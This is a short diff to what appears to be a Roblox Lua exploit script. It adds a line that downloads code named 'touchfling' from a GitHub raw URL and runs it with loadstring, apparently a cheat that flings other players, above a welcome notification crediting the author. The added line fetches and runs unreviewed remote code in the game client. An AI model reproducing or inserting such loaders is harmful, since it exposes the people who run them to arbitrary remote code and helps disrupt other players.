@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/idk/refs/heads/main/touchfling"))();
 game.StarterGui:SetCore("SendNotification", {
     Title = "WELCOME ENJOY";
     Text = "Made by Haxarebest1";
